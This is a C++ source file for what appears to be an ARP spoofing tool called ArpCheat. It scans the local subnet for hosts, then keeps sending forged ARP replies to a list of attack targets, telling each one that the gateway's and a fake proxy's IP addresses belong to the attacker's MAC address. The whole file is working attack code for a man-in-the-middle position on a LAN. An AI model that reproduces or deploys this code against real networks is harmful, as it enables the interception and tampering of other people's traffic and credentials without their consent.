

#include "ArpCheat.h"
#include "ClientAddress.h"
#include "Packet.h"
#include "PublicUtils.h"
#include "PacketProcess.h"
#include "config.h"











int ArpCheat::makeFakeClient(int fd,int index,unsigned int ip,unsigned char mac[MAC_ADDRESS_SIZE]) {
	int iRet = 0;
	unsigned char	ArpPacket[1024] = { 0 };
	LPMACHEADER		MACheader = (LPMACHEADER)ArpPacket;
	LPARPHEADER		ARPheader = (LPARPHEADER)(ArpPacket + sizeof(MACHEADER));

	memmove((char*)MACheader->DstMAC, mac, MAC_ADDRESS_SIZE);
	memmove((char*)MACheader->SrcMAC, (char*)gLocalMAC, MAC_ADDRESS_SIZE);
	MACheader->Protocol = 0x0608;
	ARPheader->HardWareType = 0x0100;
	ARPheader->ProtocolType = 0x0008;
	ARPheader->HardWareSize = MAC_ADDRESS_SIZE;
	ARPheader->ProtocolSize = 4;
	ARPheader->Opcode = 0x0200;
	memmove((char*)ARPheader->SenderMac, (char*)gLocalMAC, MAC_ADDRESS_SIZE);
	memmove(ARPheader->SenderIP, (unsigned char *)&(gFakeProxyIP), sizeof(DWORD));
	memmove((char*)ARPheader->RecverMac, mac, MAC_ADDRESS_SIZE);
	memmove(ARPheader->RecverIP, (unsigned char *)&(ip), sizeof(DWORD));

	struct sockaddr_ll sa = {0};
	sa.sll_family = PF_PACKET;
	sa.sll_hatype = ARPHRD_ETHER;
	sa.sll_pkttype = PACKET_OUTGOING;
	sa.sll_protocol = IPPROTO_TCP;
	sa.sll_ifindex = index;
	sa.sll_halen = MAC_ADDRESS_SIZE;
	memcpy(sa.sll_addr,MACheader->DstMAC,MAC_ADDRESS_SIZE);

	iRet = sendto(fd, ArpPacket, sizeof(MACHEADER) + sizeof(ARPHEADER),0,(struct sockaddr*)&sa,sizeof(sockaddr_ll));
	if (iRet <= 0)
	{
		printf("makeFakeClient sendto error\n");
	}

	return iRet;
}






int ArpCheat::sendRarps(int fd,int index) {
	int iRet = 0;
	unsigned char	ArpPacket[1024] = { 0 };
	LPMACHEADER		MACheader = (LPMACHEADER)ArpPacket;
	LPARPHEADER		ARPheader = (LPARPHEADER)(ArpPacket + sizeof(MACHEADER));

	int cnt = gAttackTarget.size();
	for (int i = 0; i < cnt; i++)
	{
		if (gAttackTarget[i].clientIP == 0 || memcmp(gAttackTarget[i].clientMAC,ZERO_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0)
		{
			continue;
		}

		memmove((char*)MACheader->DstMAC, gAttackTarget[i].clientMAC, MAC_ADDRESS_SIZE);
		memmove((char*)MACheader->SrcMAC, (char*)gLocalMAC, MAC_ADDRESS_SIZE);
		MACheader->Protocol = 0x0608;
		ARPheader->HardWareType = 0x0100;
		ARPheader->ProtocolType = 0x0008;
		ARPheader->HardWareSize = MAC_ADDRESS_SIZE;
		ARPheader->ProtocolSize = 4;
		ARPheader->Opcode = 0x0200;
		memmove((char*)ARPheader->SenderMac, (char*)gLocalMAC, MAC_ADDRESS_SIZE);
		memmove(ARPheader->SenderIP, (unsigned char *)&(gGatewayIP), sizeof(DWORD));
		memmove((char*)ARPheader->RecverMac, gAttackTarget[i].clientMAC, MAC_ADDRESS_SIZE);
		memmove(ARPheader->RecverIP, (unsigned char *)&(gAttackTarget[i].clientIP), sizeof(DWORD));

		struct sockaddr_ll sa = {0};
		sa.sll_family = PF_PACKET;
		sa.sll_hatype = ARPHRD_ETHER;
		sa.sll_pkttype = PACKET_OUTGOING;
		sa.sll_protocol = IPPROTO_TCP;
		sa.sll_ifindex = index;
		sa.sll_halen = MAC_ADDRESS_SIZE;
		memcpy(sa.sll_addr,MACheader->DstMAC,MAC_ADDRESS_SIZE);

		iRet = sendto(fd, ArpPacket, sizeof(MACHEADER) + sizeof(ARPHEADER),0,(struct sockaddr*)&sa,sizeof(sockaddr_ll));
		if (iRet <= 0)
		{
			printf("sendRarps sendto error\n");
		}

		//here
		iRet = makeFakeClient(fd,index, gAttackTarget[i].clientIP, gAttackTarget[i].clientMAC);
	}

	return iRet;
}


void* ArpCheat::ArpCheatProc(void * param)
{
	int iRet = 0;


	int sockfd = socket(PF_PACKET, SOCK_RAW , htons(ETH_P_ALL));
	if (sockfd < 0)
	{
		printf("ArpCheatProc socket error!\n");
		return param;
	}else{
		//printf("ArpCheatProc sockfd socket ok!\n");
	}

	while (1)
	{
		iRet = sendRarps(sockfd,gCardIdx);
		//iRet = adjustSelf((pcap_t*)pcap);

		sleep(gArpDelay);
	}


	close(sockfd);
	return param;
}



int ArpCheat::broadcastArp(int fd,int index, unsigned int ip) {
	int iRet = 0;
	unsigned char	ArpPacket[1024] = { 0 };
	LPMACHEADER		MACheader = (LPMACHEADER)ArpPacket;
	LPARPHEADER		ARPheader = (LPARPHEADER)(ArpPacket + sizeof(MACHEADER));

	memmove((char*)MACheader->DstMAC, BROADCAST_MAC_ADDRESS, MAC_ADDRESS_SIZE);
	memmove((char*)MACheader->SrcMAC, (char*)gLocalMAC, MAC_ADDRESS_SIZE);
	MACheader->Protocol = 0x0608;
	ARPheader->HardWareType = 0x0100;
	ARPheader->ProtocolType = 0x0008;
	ARPheader->HardWareSize = MAC_ADDRESS_SIZE;
	ARPheader->ProtocolSize = 4;
	ARPheader->Opcode = 0x0100;
	memmove((char*)ARPheader->SenderMac, (char*)gLocalMAC, MAC_ADDRESS_SIZE);
	memmove(ARPheader->SenderIP, (unsigned char *)&(gLocalIP), sizeof(DWORD));
	memmove((char*)ARPheader->RecverMac, ZERO_MAC_ADDRESS, MAC_ADDRESS_SIZE);
	memmove(ARPheader->RecverIP, (unsigned char *)&(ip), sizeof(DWORD));

	struct sockaddr_ll sa = {0};
	sa.sll_family = PF_PACKET;
	sa.sll_hatype = ARPHRD_ETHER;
	sa.sll_pkttype = PACKET_OUTGOING;
	sa.sll_protocol = IPPROTO_TCP;
	sa.sll_ifindex = index;
	sa.sll_halen = MAC_ADDRESS_SIZE;
	memcpy(sa.sll_addr,MACheader->DstMAC,MAC_ADDRESS_SIZE);

	iRet = sendto(fd, ArpPacket, sizeof(MACHEADER) + sizeof(ARPHEADER),0,(struct sockaddr*)&sa,sizeof(sockaddr_ll));
	if (iRet <= 0)
	{
		printf("broadcastArp sendto error\n");
	}

	return iRet;
}




int ArpCheat::arpReply(int fd,int index, unsigned int senederip, unsigned char sendermac[MAC_ADDRESS_SIZE],unsigned int recverip,unsigned char * recvermac)
{
	int iRet = 0;
	unsigned char	ArpPacket[1024] = { 0 };
	LPMACHEADER		MACheader = (LPMACHEADER)ArpPacket;
	LPARPHEADER		ARPheader = (LPARPHEADER)(ArpPacket + sizeof(MACHEADER));

	memmove((char*)MACheader->DstMAC, recvermac, MAC_ADDRESS_SIZE);
	memmove((char*)MACheader->SrcMAC, (char*)sendermac, MAC_ADDRESS_SIZE);
	MACheader->Protocol = 0x0608;
	ARPheader->HardWareType = 0x0100;
	ARPheader->ProtocolType = 0x0008;
	ARPheader->HardWareSize = MAC_ADDRESS_SIZE;
	ARPheader->ProtocolSize = 4;
	ARPheader->Opcode = 0x0200;
	memmove((char*)ARPheader->SenderMac, (char*)sendermac, MAC_ADDRESS_SIZE);
	memmove(ARPheader->SenderIP, (unsigned char *)&(senederip), sizeof(DWORD));
	memmove((char*)ARPheader->RecverMac, recvermac, MAC_ADDRESS_SIZE);
	memmove(ARPheader->RecverIP, (unsigned char *)&(recverip), sizeof(DWORD));

	struct sockaddr_ll sa = {0};
	sa.sll_family = PF_PACKET;
	sa.sll_hatype = ARPHRD_ETHER;
	sa.sll_pkttype = PACKET_OUTGOING;
	sa.sll_protocol = IPPROTO_TCP;
	sa.sll_ifindex = index;
	sa.sll_halen = MAC_ADDRESS_SIZE;
	memcpy(sa.sll_addr,MACheader->DstMAC,MAC_ADDRESS_SIZE);

	iRet = sendto(fd, ArpPacket, sizeof(MACHEADER) + sizeof(ARPHEADER),0,(struct sockaddr*)&sa,sizeof(sockaddr_ll));
	if (iRet <= 0)
	{
		printf("arpReply sendto error\n");
	}

	return iRet;
}







int ArpCheat::arpSnifferOneTime(vector<CLIENTADDRESSES> & targetslist){
	int ret = 0;

	printf("scanning local net work host,please wait a few seconds...\r\n");

	unsigned char	ArpPacket[PACKET_RECV_BUF_SIZE] = { 0 };
	LPMACHEADER		MACheader = (LPMACHEADER)ArpPacket;
	LPARPHEADER		ARPheader = (LPARPHEADER)(ArpPacket + sizeof(MACHEADER));

	struct sockaddr_ll sa = {0};

	int sockfd = socket(PF_PACKET, SOCK_RAW , htons(ETH_P_ALL));		//CAN NOT be RP | ETH_P_RARP,why?
	if (sockfd < 0)
	{
		printf("arpSnifferOneTime socket error!\n");
		return -1;
	}


	struct timeval timeout = {0};
	timeout.tv_sec = ARP_SCAN_TIMEDELAY;
	ret = setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(struct timeval));
	if(ret < 0){
		close(sockfd);
		printf("arpSnifferOneTime setsockopt error code:%d\n",errno);
		//return -1;
	}

	int cnt = Config::getSubnetSize();

	for(int i = 0; i< cnt; i ++){
		unsigned int dstip = ntohl(ntohl(gNetMaskIP) + i);

		if(i == 0 || i == 0xff || dstip == gLocalIP || dstip  == gGatewayIP){
			continue;
		}

		memmove((char*)MACheader->DstMAC, BROADCASTMACADDRESS, MAC_ADDRESS_SIZE);
		memmove((char*)MACheader->SrcMAC, (char*)gLocalMAC, MAC_ADDRESS_SIZE);
		MACheader->Protocol = 0x0608;
		ARPheader->HardWareType = 0x0100;
		ARPheader->ProtocolType = 0x0008;
		ARPheader->HardWareSize = MAC_ADDRESS_SIZE;
		ARPheader->ProtocolSize = sizeof(unsigned int);
		ARPheader->Opcode = 0x0100;
		memmove((char*)ARPheader->SenderMac, (char*)gLocalMAC, MAC_ADDRESS_SIZE);
		memmove(ARPheader->SenderIP, (unsigned char *)&(gLocalIP), sizeof(unsigned int ));
		memmove((char*)ARPheader->RecverMac, ZEROMACADDRESS, MAC_ADDRESS_SIZE);
		memmove(ARPheader->RecverIP, (unsigned char *)&dstip, sizeof(unsigned int));


		sa.sll_family = PF_PACKET;
		sa.sll_hatype = ARPHRD_ETHER;
		sa.sll_pkttype = PACKET_OUTGOING;
		sa.sll_protocol = IPPROTO_TCP;
		sa.sll_ifindex = gCardIdx;
		sa.sll_halen = MAC_ADDRESS_SIZE;
		memcpy(sa.sll_addr,MACheader->DstMAC,MAC_ADDRESS_SIZE);
		ret = sendto(sockfd,ArpPacket,sizeof(ARPHEADER) + sizeof(MACHEADER),0,(struct sockaddr*)&sa,sizeof(sockaddr_ll));
		if (ret <= 0)
		{
			close(sockfd);
			printf("arpSnifferOneTime sendto error\n");
			return -1;
		}
	}

	struct timespec oldtime;
	clock_gettime(CLOCK_MONOTONIC, &oldtime);

	while(1){

		struct timespec newtime;
		clock_gettime(CLOCK_MONOTONIC, &newtime);
		if(newtime.tv_sec - oldtime.tv_sec > ARP_SCAN_TIMEDELAY ){
			printf("arpSnifferOneTime get targets time out\r\n");
			break;
		}

		socklen_t socksize = sizeof(sockaddr_ll);
		ret = recvfrom(sockfd,ArpPacket,PACKET_RECV_BUF_SIZE,0,(sockaddr*)&sa,&socksize);
		if(ret < 0 || errno == EWOULDBLOCK){
			break;
		}else if(ret == 0){
			//printf("arp query over time\r\n");
			break;
		}else if(ret < (int)(sizeof(ARPHEADER) + sizeof(MACHEADER))){
			//printf("arp query packet error\r\n");
			continue;
		}

		if(MACheader->Protocol == 0x0608 && ARPheader->HardWareType == 0x0100 && ARPheader->ProtocolType == 0x0008 &&
				ARPheader->HardWareSize == MAC_ADDRESS_SIZE &&
				ARPheader->ProtocolSize == sizeof(unsigned int) && ARPheader->Opcode == 0x0200){

			unsigned int recvip = *(unsigned int*)ARPheader->RecverIP;
			//unsigned int sendip = *(unsigned int *)ARPheader->SenderIP;
			if(memcmp(ARPheader->RecverMac,gLocalMAC,MAC_ADDRESS_SIZE) == 0 && gLocalIP == recvip  ){


				unsigned int dstip = *(unsigned int*)ARPheader->SenderIP;
				unsigned char*dstmac = ARPheader->SenderMac;

				ret = Config::addTarget(targetslist, dstip, dstmac);

				printf("arpSnifferOneTime find mac:%02x-%02x-%02x-%02x-%02x-%02x,ip:%u.%u.%u.%u\r\n",
						dstmac[0],dstmac[1],dstmac[2],dstmac[3],dstmac[4],dstmac[5],dstip&0xff,(dstip&0xff00)>>8,(dstip&0xff0000)>>16,(dstip&0xff000000)>>24);
			}
		}
	}

	close(sockfd);


	return 0;

}







//errno == EWOULDBLOCK
int ArpCheat::sendArp(unsigned int dstip,unsigned char * dstmac){
	int ret = 0;
	memmove(dstmac,ZEROMACADDRESS,MAC_ADDRESS_SIZE);

	unsigned char	ArpPacket[PACKET_RECV_BUF_SIZE] = { 0 };
	LPMACHEADER		MACheader = (LPMACHEADER)ArpPacket;
	LPARPHEADER		ARPheader = (LPARPHEADER)(ArpPacket + sizeof(MACHEADER));

	int sockfd = socket(PF_PACKET, SOCK_RAW , htons(ETH_P_ALL));		//CAN NOT be RP | ETH_P_RARP,why?
	if (sockfd < 0)
	{
		printf("sendArp socket error!\n");
		return -1;
	}



	memmove((char*)MACheader->DstMAC, BROADCASTMACADDRESS, MAC_ADDRESS_SIZE);
	memmove((char*)MACheader->SrcMAC, (char*)gLocalMAC, MAC_ADDRESS_SIZE);
	MACheader->Protocol = 0x0608;
	ARPheader->HardWareType = 0x0100;
	ARPheader->ProtocolType = 0x0008;
	ARPheader->HardWareSize = MAC_ADDRESS_SIZE;
	ARPheader->ProtocolSize = sizeof(unsigned int);
	ARPheader->Opcode = 0x0100;
	memmove((char*)ARPheader->SenderMac, (char*)gLocalMAC, MAC_ADDRESS_SIZE);
	memmove(ARPheader->SenderIP, (unsigned char *)&(gLocalIP), sizeof(unsigned int ));
	memmove((char*)ARPheader->RecverMac, ZEROMACADDRESS, MAC_ADDRESS_SIZE);
	memmove(ARPheader->RecverIP, (unsigned char *)&dstip, sizeof(unsigned int));

	struct sockaddr_ll sa = {0};
	sa.sll_family = PF_PACKET;
	sa.sll_hatype = ARPHRD_ETHER;
	sa.sll_pkttype = PACKET_OUTGOING;
	sa.sll_protocol = IPPROTO_TCP;
	sa.sll_ifindex = gCardIdx;
	sa.sll_halen = MAC_ADDRESS_SIZE;
	memcpy(sa.sll_addr,MACheader->DstMAC,MAC_ADDRESS_SIZE);
	ret = sendto(sockfd,ArpPacket,sizeof(ARPHEADER) + sizeof(MACHEADER),0,(struct sockaddr*)&sa,sizeof(sockaddr_ll));
	if (ret <= 0)
	{
		close(sockfd);
		printf("sendArp sendto error\n");
		return -1;
	}

	struct timeval timeout = {0};
	timeout.tv_sec = ARP_FIRSTSCAN_TIMEDELAY;
	ret = setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(struct timeval));
	if(ret < 0){
		close(sockfd);
		printf("sendArp setsockopt error code:%d\n",errno);
		return -1;
	}

	struct timespec oldtime;
	clock_gettime(CLOCK_MONOTONIC, &oldtime);

	while(1){
		struct timespec newtime;
		clock_gettime(CLOCK_MONOTONIC, &newtime);
		if(newtime.tv_sec - oldtime.tv_sec > ARP_FIRSTSCAN_TIMEDELAY){
			break;
		}

		socklen_t socksize = sizeof(sockaddr_ll);
		ret = recvfrom(sockfd,ArpPacket,PACKET_RECV_BUF_SIZE,0,(sockaddr*)&sa,&socksize);
		if(ret < 0 ){
			printf("arp query over time\r\n");
			break;
		}else if(ret == 0){
			//printf("arp query over time\r\n");
			continue;
		}else if(ret < (int)(sizeof(ARPHEADER) + sizeof(MACHEADER))){
			//printf("arp query packet error\r\n");
			continue;
		}

		if(MACheader->Protocol == 0x0608 && ARPheader->HardWareType == 0x0100 && ARPheader->ProtocolType == 0x0008 && ARPheader->HardWareSize == MAC_ADDRESS_SIZE &&
				ARPheader->ProtocolSize == sizeof(unsigned int) && ARPheader->Opcode == 0x0200){

			unsigned int recvip = *(unsigned int*)ARPheader->RecverIP;
			unsigned int sendip = *(unsigned int *)ARPheader->SenderIP;
			if(memcmp(ARPheader->RecverMac,gLocalMAC,MAC_ADDRESS_SIZE) == 0 && gLocalIP == recvip && dstip == sendip ){

				memmove(dstmac,ARPheader->SenderMac,MAC_ADDRESS_SIZE);

				printf("sendArp find mac:%02x-%02x-%02x-%02x-%02x-%02x,ip:%u.%u.%u.%u\r\n",
						dstmac[0],dstmac[1],dstmac[2],dstmac[3],dstmac[4],dstmac[5],dstip&0xff,(dstip&0xff00)>>8,(dstip&0xff0000)>>16,(dstip&0xff000000)>>24);
				break;
			}
		}
	}

	close(sockfd);

	if(memcmp(dstmac,ZEROMACADDRESS,MAC_ADDRESS_SIZE) == 0){
		return -1;
	}else{
		return 0;
	}
}







